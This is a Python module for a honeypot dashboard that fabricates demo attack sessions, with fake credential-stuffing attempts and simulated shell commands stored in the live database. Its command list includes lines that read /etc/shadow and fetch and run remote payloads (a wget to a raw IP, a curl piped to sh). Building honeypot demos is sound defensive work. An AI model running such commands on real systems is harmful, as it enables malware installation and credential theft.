"""Fabricated worldwide attack generator (presentation / demo aid).

Produces realistic-looking honeypot traffic — sessions from weighted-random
countries, credential-stuffing attempts drawn from the real wordlists, and
post-authentication shell commands — and writes it through the SAME
``db_insert_*`` pipeline the live honeypot uses. That means fabricated and real
attacks share one code path, one database, and one dashboard.

Two modes:
- ``fabricate_burst(...)`` — a one-shot batch (wired to the Bot Swarm / Slow
  Human / Custom buttons).
- ``DemoMode`` — a background thread that emits attacks continuously until
  stopped (wired to the Demo Mode toggle).
"""

import random
import threading
import time
import uuid

from core import enrichment
from core.classification import classify_session
from core.database import (
    db_insert_attempt,
    db_insert_session,
    db_insert_shell_command,
    db_update_classification,
)
from core.fake_shell import INTENT_TAGS
from webapp.geo import random_origin, random_public_ip

# Fallback wordlists used only if the real lists were not loaded.
_FALLBACK_USERS = ["root", "admin", "user", "test", "oracle", "ubuntu", "pi", "ftp", "guest"]
_FALLBACK_PASSWORDS = [
    "123456", "password", "admin", "root", "toor", "12345678", "qwerty",
    "letmein", "changeme", "password123", "raspberry", "1234", "abc123",
]

# Commands an attacker might run once "inside" — mix of recon, malware pull,
# credential theft and persistence (keys overlap with INTENT_TAGS), plus benign
# noise so the transcript looks human.
_SHELL_COMMANDS = [
    "uname -a", "whoami", "id", "ls -la", "cat /etc/passwd", "cat /etc/shadow",
    "ps aux", "netstat -antp", "ifconfig", "ip addr",
    "wget http://45.13.227.9/x86_64 -O /tmp/.s", "curl -s http://malw.re/i.sh | sh",
    "crontab -l", "history", "cat /proc/cpuinfo", "free -m",
]


def _cred_pools():
    users, passwords = set(), set()
    for user, pwd in enrichment.DEFAULT_CREDS:
        users.add(user)
        passwords.add(pwd)
    passwords |= enrichment.COMMON_PASSWORDS
    users = list(users) or list(_FALLBACK_USERS)
    passwords = list(passwords) or list(_FALLBACK_PASSWORDS)
    return users, passwords


def _intent_for(command: str):
    low = command.lower()
    for keyword, tag in INTENT_TAGS.items():
        if keyword in low:
            return tag
    return None


def _make_session_id() -> str:
    return str(uuid.uuid4())


def fabricate_one(profile: str = "bot", emit=None) -> dict:
    """Create a single fabricated session with several attempts and optional
    post-auth shell activity. ``profile`` is 'bot' or 'human'. ``emit`` is an
    optional callback for logging. Returns a small summary dict."""
    users, passwords = _cred_pools()
    origin = random_origin()
    ip = random_public_ip()
    protocol = random.choice(["SSH", "FTP"])
    port = random.randint(1024, 65535)
    session_id = _make_session_id()

    geo = (origin["country"], origin["city"], origin["lat"], origin["lon"])
    db_insert_session(session_id, ip, port, protocol, geo=geo)

    if profile == "human":
        n_attempts = random.randint(2, 4)
        delay_range = (3200, 9000)
        granted = random.random() < 0.35
    else:  # bot
        n_attempts = random.randint(3, 6)
        delay_range = (40, 420)
        granted = random.random() < 0.55

    now = time.time()
    for i in range(n_attempts):
        username = random.choice(users)
        password = random.choice(passwords)
        delay_ms = None if i == 0 else round(random.uniform(*delay_range), 1)
        is_default, is_common = enrichment.enrich_credentials(username, password)
        db_insert_attempt(session_id, username, password, now, delay_ms, is_default, is_common)

    classification = classify_session(session_id)
    db_update_classification(session_id, classification)

    commands = []
    if granted:
        for _ in range(random.randint(2, 6)):
            cmd = random.choice(_SHELL_COMMANDS)
            db_insert_shell_command(session_id, cmd, time.time(), _intent_for(cmd))
            commands.append(cmd)

    summary = {
        "session_id": session_id,
        "ip": ip,
        "country": origin["country"],
        "protocol": protocol,
        "classification": classification,
        "attempts": n_attempts,
        "granted": granted,
        "commands": commands,
    }
    if emit:
        emit(summary)
    return summary


def fabricate_burst(count: int = 8, profile: str = "bot", spacing: float = 0.18):
    """Generate ``count`` fabricated sessions, lightly spaced in time so the
    dashboard's poller streams them in as a live wave rather than all at once."""
    count = max(1, min(int(count), 200))
    for _ in range(count):
        fabricate_one(profile=profile)
        if spacing:
            time.sleep(spacing)


class DemoMode:
    """Continuously fabricates attacks on a background thread until stopped."""

    def __init__(self):
        self._thread = None
        self._stop = threading.Event()

    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def start(self):
        if self.running:
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()

    def _loop(self):
        while not self._stop.is_set():
            profile = "human" if random.random() < 0.25 else "bot"
            fabricate_one(profile=profile)
            # Irregular cadence feels more organic than a fixed tick.
            self._stop.wait(random.uniform(0.6, 2.2))


demo_mode = DemoMode()
